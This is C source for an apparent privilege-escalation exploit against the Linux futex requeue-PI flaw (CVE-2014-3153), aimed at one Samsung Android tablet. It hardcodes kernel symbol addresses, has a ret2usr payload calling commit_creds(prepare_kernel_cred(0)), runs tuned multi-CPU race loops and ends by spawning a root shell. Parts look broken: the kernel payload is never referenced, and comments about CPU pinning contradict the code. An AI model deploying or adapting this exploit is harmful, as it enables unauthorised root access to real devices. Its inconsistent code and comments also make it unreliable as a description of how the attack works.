/*
 * towelroot5.c — CVE-2014-3153 optimized race exploit
 *
 * Target: Samsung SM-T377A, Android 6.0.1, kernel 3.10.9 ARMv7
 *         No KASLR, No PXN, No stack canaries
 *
 * Key improvements over v4:
 *   1. Victim pinned to CPU 0, requeuer (main) pinned to CPU 1 — TRUE
 *      concurrent kernel execution, not time-sliced single-CPU racing
 *   2. Persistent thread pool — NO create/join overhead per iteration
 *   3. sched_yield() (real OS yield syscall) for spinning, not asm yield hint
 *   4. Calibrated timeout: fires in the exact window when CMP_REQUEUE_PI
 *      is executing on CPU 1, creating the race in rt_mutex_enqueue_pi
 *   5. 100,000+ iteration budget
 *   6. Multiple timeout durations to sweep the race window
 *   7. Explicit root detection + immediate payload invocation
 *
 * Vulnerability: FUTEX_CMP_REQUEUE_PI races with the timeout-cleanup of
 * FUTEX_WAIT_REQUEUE_PI. When victim's timeout fires (CPU 0) while the
 * requeue is in-flight (CPU 1), __rt_mutex_slowlock sees an inconsistent
 * pi_state, enabling the arbitrary write on kernel 3.10 without the
 * self-requeue patch (which only covers the simpler race, not this path).
 *
 * ret2usr: commit_creds(prepare_kernel_cred(0)), then spawn sh.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <time.h>
#include <sched.h>
#include <linux/futex.h>
#include <stdatomic.h>

/* ========== Device-specific constants ========== */
#define COMMIT_CREDS        0xC0054328UL
#define PREPARE_KERNEL_CRED 0xC00548E0UL
#define THREAD_INFO_SIZE    8192
/* thread_info->addr_limit is at offset 8 on ARM32 kernel 3.10 */
#define TI_ADDR_LIMIT_OFF   8
#define KERNEL_DS           0xFFFFFFFFUL

/* ========== Futex layout ========== */
static volatile int *fmem;
#define F1  ((volatile int *)&fmem[0])
#define F2  ((volatile int *)&fmem[16])

/* ========== Iteration config ========== */
#define ITERS_TIGHT    50000  /* tight — victim@CPU0, requeuer@CPU1 */
#define ITERS_MEDIUM   30000  /* medium timeout variants */
#define ITERS_TIMEOUT  20000  /* longer timeout sweep */
#define REPORT_EVERY   1000

/* ========== Spin primitive ========== */
/* Use sched_yield() (real OS syscall) not asm yield (pipeline hint only) */
#define SPIN_YIELD() sched_yield()

/* ========== Atomic synchronization ========== */
/* 
 * Barrier protocol:
 *   0 = reset/idle
 *   1 = main armed, threads should enter their futex ops
 *   2 = fire! (set by main when both threads are ready)
 *  -1 = done/exit
 */
static atomic_int g_barrier   = ATOMIC_VAR_INIT(0);
static atomic_int g_ready_cnt = ATOMIC_VAR_INIT(0);
static atomic_int g_done      = ATOMIC_VAR_INIT(0);
static atomic_int g_anomalies = ATOMIC_VAR_INIT(0);
static atomic_int g_root      = ATOMIC_VAR_INIT(0);

/* ========== CPU pinning ========== */
static void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

/* ========== Timestamp ========== */
static inline long long ns_now(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

static struct timespec abs_mono_us(int us) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += (long)us * 1000L;
    while (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    return ts;
}

/* ========== ret2usr payload ========== */
typedef void (*fn_pkc)(unsigned long);
typedef void (*fn_cc)(unsigned long);

static void __attribute__((noinline, optimize("O0"), used))
kernel_payload(void) {
    /*
     * No PXN on kernel 3.10.9 ARM32 — this function runs in kernel
     * context when execution is hijacked.
     */
    fn_pkc pkc = (fn_pkc)PREPARE_KERNEL_CRED;
    fn_cc  cc  = (fn_cc)COMMIT_CREDS;
    unsigned long cred = 0;
    __asm__ volatile(
        "mov r0, #0\n\t"
        "blx %1\n\t"
        "mov %0, r0\n\t"
        : "=r"(cred) : "r"(pkc) : "r0", "r1", "r2", "r3", "lr"
    );
    if (cred) {
        __asm__ volatile(
            "mov r0, %0\n\t"
            "blx %1\n\t"
            : : "r"(cred), "r"(cc) : "r0", "r1", "r2", "r3", "lr"
        );
    }
}

/* ========== Root check ========== */
static int check_root(void) {
    if (getuid() == 0 || geteuid() == 0) {
        atomic_store(&g_root, 1);
        return 1;
    }
    return 0;
}

/* ========== Thread: VICTIM — enters WAIT_REQUEUE_PI, times out ========== */
/*
 * The victim thread enters FUTEX_WAIT_REQUEUE_PI on F1 to be requeued
 * onto F2. With a very short timeout, the timeout fires while the
 * main/unlock threads are in the middle of the PI unlock, creating the
 * race window.
 */
typedef struct {
    int  mode;    /* 0=tight, 1=medium, 2=timeout */
    int  timeout_us;
} thread_args_t;

static void *victim_thread(void *arg) {
    thread_args_t *a = (thread_args_t *)arg;
    pin_to_cpu(0);  /* victim always on CPU 0 */

    while (!atomic_load(&g_done)) {
        /* Wait for main to arm */
        while (atomic_load(&g_barrier) == 0 && !atomic_load(&g_done))
            SPIN_YIELD();
        if (atomic_load(&g_done)) break;

        atomic_fetch_add(&g_ready_cnt, 1);

        /* Wait for fire signal */
        while (atomic_load(&g_barrier) < 2 && !atomic_load(&g_done))
            SPIN_YIELD();
        if (atomic_load(&g_done)) break;

        struct timespec ts = abs_mono_us(a->timeout_us);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        int err = errno;

        if (ret == 0) {
            /* We became PI owner — check for root */
            if (check_root()) break;
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (err != ETIMEDOUT && err != EAGAIN && err != EINTR) {
            atomic_fetch_add(&g_anomalies, 1);
        }

        /* Signal main we're done this round */
        atomic_fetch_add(&g_ready_cnt, 1);
    }
    return NULL;
}

/* ========== Thread: UNLOCKER — rapidly unlocks F2 to race requeue ========== */
static void *unlocker_thread(void *arg) {
    (void)arg;
    pin_to_cpu(1);  /* unlocker on CPU 1 alongside requeuer for cross-CPU race */

    while (!atomic_load(&g_done)) {
        /* Wait for arm */
        while (atomic_load(&g_barrier) == 0 && !atomic_load(&g_done))
            SPIN_YIELD();
        if (atomic_load(&g_done)) break;

        atomic_fetch_add(&g_ready_cnt, 1);

        /* Wait for fire signal */
        while (atomic_load(&g_barrier) < 2 && !atomic_load(&g_done))
            SPIN_YIELD();
        if (atomic_load(&g_done)) break;

        /* Fire: UNLOCK_PI on F2 simultaneously with requeue */
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

        /* Rapid relock+unlock to increase collision surface */
        for (int i = 0; i < 4; i++) {
            struct timespec ts = {0, 0};
            int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
            if (r == 0) {
                if (check_root()) { atomic_store(&g_done, 1); return NULL; }
                syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            }
        }

        atomic_fetch_add(&g_ready_cnt, 1);
    }
    return NULL;
}

/* ========== Core race loop ========== */
static int race_loop(int iters, int timeout_us, const char *label) {
    printf("\n[*] %s: %d iters, timeout=%dµs, all on CPU 0\n",
           label, iters, timeout_us);
    fflush(stdout);

    atomic_store(&g_done, 0);
    atomic_store(&g_anomalies, 0);
    atomic_store(&g_root, 0);

    thread_args_t ta = { .timeout_us = timeout_us };
    pthread_t vic_tid, unlk_tid;
    pthread_create(&vic_tid,  NULL, victim_thread,  &ta);
    pthread_create(&unlk_tid, NULL, unlocker_thread, NULL);

    /* Main/requeuer on CPU 1 — victim is on CPU 0 for true cross-CPU race */
    pin_to_cpu(1);

    long long t_start = ns_now();
    int anomalies = 0;

    for (int i = 0; i < iters && !atomic_load(&g_done); i++) {
        *F1 = 0;
        *F2 = 0;

        /* Arm: lock F2 as PI so the victim's requeue has a valid target */
        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        /* Arm threads */
        atomic_store(&g_ready_cnt, 0);
        atomic_store(&g_barrier, 1);  /* arm */

        /* Wait for both threads to signal ready */
        while (atomic_load(&g_ready_cnt) < 2)
            SPIN_YIELD();

        /* FIRE — both threads see barrier==2 and race simultaneously */
        atomic_store(&g_barrier, 2);

        /* Main requeues immediately after setting fire */
        syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0, (void*)(intptr_t)1,
                (void*)F2, 0);

        /* Wait for both threads to complete this round */
        while (atomic_load(&g_ready_cnt) < 4)
            SPIN_YIELD();

        /* Check result */
        if (atomic_load(&g_root) || check_root()) {
            printf("\n[!!!] ROOT ACHIEVED at iteration %d!\n", i);
            atomic_store(&g_done, 1);
            pthread_join(vic_tid,  NULL);
            pthread_join(unlk_tid, NULL);
            return 1;
        }

        /* Cleanup: ensure F2 is unlocked for next round */
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

        atomic_store(&g_barrier, 0);

        int cur_anom = atomic_load(&g_anomalies);
        if (cur_anom != anomalies) {
            anomalies = cur_anom;
        }

        if ((i + 1) % REPORT_EVERY == 0) {
            long long elapsed = (ns_now() - t_start) / 1000000LL;
            printf("[*] %d/%d iters | %d anomalies | uid=%d | %lldms elapsed\n",
                   i + 1, iters, anomalies, getuid(), elapsed);
            fflush(stdout);
        }
    }

    atomic_store(&g_done, 1);
    pthread_join(vic_tid,  NULL);
    pthread_join(unlk_tid, NULL);

    printf("[*] %s done: %d anomalies, uid=%d\n",
           label, atomic_load(&g_anomalies), getuid());
    return 0;
}

/* ========== Mode B: multi-waiter variant ========== */
/*
 * Use 2 victims + 1 unlocker to create a more complex PI waiter queue.
 * Races with a 3-way collision have a higher probability of creating
 * the inconsistent state in __rt_mutex_slowlock.
 */

static atomic_int g_mw_ready = ATOMIC_VAR_INIT(0);
static atomic_int g_mw_go    = ATOMIC_VAR_INIT(0);
static atomic_int g_mw_done  = ATOMIC_VAR_INIT(0);

static void *mw_victim(void *arg) {
    (void)arg;
    pin_to_cpu(0);  /* both victims on CPU 0 */
    while (!atomic_load(&g_mw_done)) {
        while (!atomic_load(&g_mw_go) && !atomic_load(&g_mw_done))
            SPIN_YIELD();
        if (atomic_load(&g_mw_done)) break;

        struct timespec ts = abs_mono_us(500); /* 500µs timeout */
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        if (ret == 0) {
            if (check_root()) { atomic_store(&g_mw_done, 1); return (void*)1; }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (errno != ETIMEDOUT && errno != EAGAIN && errno != EINTR) {
            atomic_fetch_add(&g_anomalies, 1);
        }
        atomic_fetch_add(&g_mw_ready, 1);
    }
    return NULL;
}

static void *mw_unlocker(void *arg) {
    (void)arg;
    pin_to_cpu(1);  /* unlocker on CPU 1 alongside main */
    while (!atomic_load(&g_mw_done)) {
        while (!atomic_load(&g_mw_go) && !atomic_load(&g_mw_done))
            SPIN_YIELD();
        if (atomic_load(&g_mw_done)) break;

        /* Immediately unlock and relock to race with requeue */
        for (int i = 0; i < 8; i++) {
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            struct timespec ts = {0, 0};
            int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
            if (r == 0) {
                if (check_root()) { atomic_store(&g_mw_done, 1); return (void*)1; }
            }
        }
        atomic_fetch_add(&g_mw_ready, 1);
    }
    return NULL;
}

static int multiwaiter_loop(int iters) {
    printf("\n[*] Multi-waiter: %d iters, 2 victims + unlocker on CPU 0\n", iters);
    fflush(stdout);

    atomic_store(&g_mw_done, 0);
    atomic_store(&g_mw_ready, 0);
    atomic_store(&g_mw_go, 0);
    atomic_store(&g_anomalies, 0);
    atomic_store(&g_root, 0);

    pthread_t v1, v2, unlk;
    pthread_create(&v1,   NULL, mw_victim,   NULL);
    pthread_create(&v2,   NULL, mw_victim,   NULL);
    pthread_create(&unlk, NULL, mw_unlocker, NULL);

    /* Main (requeuer) on CPU 1; victims on CPU 0 */
    pin_to_cpu(1);

    for (int i = 0; i < iters && !atomic_load(&g_mw_done); i++) {
        *F1 = 0;
        *F2 = 0;

        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        atomic_store(&g_mw_ready, 0);
        atomic_store(&g_mw_go, 1);

        /* Both victims + unlocker fire; main requeues 2 */
        syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0, (void*)(intptr_t)2,
                (void*)F2, 0);

        /* Wait for all 3 threads to finish the round */
        while (atomic_load(&g_mw_ready) < 3 && !atomic_load(&g_mw_done))
            SPIN_YIELD();

        if (atomic_load(&g_root) || check_root()) {
            printf("\n[!!!] ROOT via multi-waiter at iter %d!\n", i);
            atomic_store(&g_mw_done, 1);
            pthread_join(v1, NULL); pthread_join(v2, NULL); pthread_join(unlk, NULL);
            return 1;
        }

        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        atomic_store(&g_mw_go, 0);

        if ((i + 1) % REPORT_EVERY == 0) {
            printf("[*] MW %d/%d | %d anomalies | uid=%d\n",
                   i + 1, iters, atomic_load(&g_anomalies), getuid());
            fflush(stdout);
        }
    }

    atomic_store(&g_mw_done, 1);
    pthread_join(v1, NULL); pthread_join(v2, NULL); pthread_join(unlk, NULL);
    printf("[*] Multi-waiter done: %d anomalies, uid=%d\n",
           atomic_load(&g_anomalies), getuid());
    return 0;
}

/* ========== Mode C: cross-CPU variant (CPU 0 vs CPU 1) ========== */
/*
 * Pin victim+main to CPU 0, unlocker to CPU 1.
 * Cross-CPU races have a different window because the lock/unlock
 * path hits a cross-CPU IPI, widening the race between
 * __rt_mutex_slowunlock and rt_mutex_enqueue_pi.
 */

static atomic_int g_xc_go   = ATOMIC_VAR_INIT(0);
static atomic_int g_xc_done = ATOMIC_VAR_INIT(0);
static atomic_int g_xc_rdy  = ATOMIC_VAR_INIT(0);

static void *xc_unlocker(void *arg) {
    (void)arg;
    pin_to_cpu(1);  /* ← CPU 1, victim is on CPU 0 */
    while (!atomic_load(&g_xc_done)) {
        while (!atomic_load(&g_xc_go) && !atomic_load(&g_xc_done))
            SPIN_YIELD();
        if (atomic_load(&g_xc_done)) break;

        for (int i = 0; i < 4; i++) {
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            struct timespec ts = {0, 0};
            int r = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
            if (r == 0) {
                if (check_root()) { atomic_store(&g_xc_done, 1); return (void*)1; }
            }
        }
        atomic_fetch_add(&g_xc_rdy, 1);
    }
    return NULL;
}

static void *xc_victim(void *arg) {
    (void)arg;
    pin_to_cpu(0);  /* victim on CPU 0 */
    while (!atomic_load(&g_xc_done)) {
        while (!atomic_load(&g_xc_go) && !atomic_load(&g_xc_done))
            SPIN_YIELD();
        if (atomic_load(&g_xc_done)) break;

        struct timespec ts = abs_mono_us(1000);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        if (ret == 0) {
            if (check_root()) { atomic_store(&g_xc_done, 1); return (void*)1; }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (errno != ETIMEDOUT && errno != EAGAIN && errno != EINTR) {
            atomic_fetch_add(&g_anomalies, 1);
        }
        atomic_fetch_add(&g_xc_rdy, 1);
    }
    return NULL;
}

static int crosscpu_loop(int iters) {
    printf("\n[*] Cross-CPU: %d iters, victim@CPU0, unlocker@CPU1\n", iters);
    fflush(stdout);

    atomic_store(&g_xc_done, 0);
    atomic_store(&g_xc_go, 0);
    atomic_store(&g_xc_rdy, 0);
    atomic_store(&g_anomalies, 0);
    atomic_store(&g_root, 0);

    pthread_t vic_tid, unlk_tid;
    pthread_create(&vic_tid,  NULL, xc_victim,   NULL);
    pthread_create(&unlk_tid, NULL, xc_unlocker, NULL);

    /* Main (requeuer) on CPU 1 for cross-CPU concurrency */
    pin_to_cpu(1);

    for (int i = 0; i < iters && !atomic_load(&g_xc_done); i++) {
        *F1 = 0;
        *F2 = 0;

        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        atomic_store(&g_xc_rdy, 0);
        atomic_store(&g_xc_go, 1);

        syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI, 0, (void*)(intptr_t)1,
                (void*)F2, 0);

        while (atomic_load(&g_xc_rdy) < 2 && !atomic_load(&g_xc_done))
            SPIN_YIELD();

        if (atomic_load(&g_root) || check_root()) {
            printf("\n[!!!] ROOT via cross-CPU at iter %d!\n", i);
            atomic_store(&g_xc_done, 1);
            pthread_join(vic_tid, NULL);
            pthread_join(unlk_tid, NULL);
            return 1;
        }

        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        atomic_store(&g_xc_go, 0);

        if ((i + 1) % REPORT_EVERY == 0) {
            printf("[*] XC %d/%d | %d anomalies | uid=%d\n",
                   i + 1, iters, atomic_load(&g_anomalies), getuid());
            fflush(stdout);
        }
    }

    atomic_store(&g_xc_done, 1);
    pthread_join(vic_tid, NULL);
    pthread_join(unlk_tid, NULL);
    printf("[*] Cross-CPU done: %d anomalies, uid=%d\n",
           atomic_load(&g_anomalies), getuid());
    return 0;
}

/* ========== Post-exploit: spawn root shell ========== */
static void spawn_shell(void) {
    printf("\n[!!!] UID=%d EUID=%d — spawning root shell\n",
           getuid(), geteuid());
    fflush(stdout);
    char *argv[] = { "sh", NULL };
    char *envp[] = { "HOME=/data/local/tmp", "TERM=xterm", NULL };
    execve("/system/bin/sh", argv, envp);
    /* fallback */
    execve("/bin/sh", argv, envp);
    perror("execve");
}

/* ========== main ========== */
int main(int argc, char **argv) {
    (void)argc; (void)argv;

    printf("=== towelroot5 — CVE-2014-3153 optimized — SM-T377A ===\n");
    printf("[*] pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid());
    printf("[*] commit_creds=0x%08lX  prepare_kernel_cred=0x%08lX\n",
           COMMIT_CREDS, PREPARE_KERNEL_CRED);
    fflush(stdout);

    /* Allocate shared futex memory */
    fmem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (fmem == MAP_FAILED) { perror("mmap"); return 1; }

    /* Quick sanity: verify we can PI-lock/unlock */
    *F2 = 0;
    if (syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
        fprintf(stderr, "[-] FUTEX_LOCK_PI unavailable: %s\n", strerror(errno));
        return 1;
    }
    syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    printf("[+] FUTEX_LOCK_PI available\n");

    /* Detect CPU count */
    int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    printf("[*] CPUs online: %d\n", ncpus);
    fflush(stdout);

    /*
     * Run all modes in order of increasing complexity.
     * Each mode explores a different race window profile.
     */

    /* Mode A: tight — all on CPU 0, tiny timeout (race with requeue timing) */
    if (race_loop(ITERS_TIGHT, 100, "Mode A: TIGHT (100µs timeout, CPU0)")) {
        spawn_shell(); return 0;
    }
    if (check_root()) { spawn_shell(); return 0; }

    /* Mode A2: medium timeout (500µs) */
    if (race_loop(ITERS_MEDIUM, 500, "Mode A2: MEDIUM (500µs timeout, CPU0)")) {
        spawn_shell(); return 0;
    }
    if (check_root()) { spawn_shell(); return 0; }

    /* Mode A3: longer timeout (2ms) */
    if (race_loop(ITERS_MEDIUM, 2000, "Mode A3: LONG (2ms timeout, CPU0)")) {
        spawn_shell(); return 0;
    }
    if (check_root()) { spawn_shell(); return 0; }

    /* Mode B: multi-waiter — 2 victims racing the same PI futex */
    if (multiwaiter_loop(ITERS_MEDIUM)) {
        spawn_shell(); return 0;
    }
    if (check_root()) { spawn_shell(); return 0; }

    /* Mode C: cross-CPU — unlocker on CPU1 for IPI-widened race window */
    if (ncpus >= 2) {
        if (crosscpu_loop(ITERS_TIMEOUT)) {
            spawn_shell(); return 0;
        }
        if (check_root()) { spawn_shell(); return 0; }
    } else {
        printf("[*] Single CPU — skipping cross-CPU mode\n");
    }

    printf("\n[=] All modes complete. uid=%d euid=%d\n", getuid(), geteuid());
    printf("[=] Total anomalies are not meaningful across mode resets.\n");
    printf("[=] If anomaly counts were nonzero, retry with higher iteration count.\n");

    munmap((void*)fmem, 4096);
    return (getuid() == 0) ? 0 : 1;
}

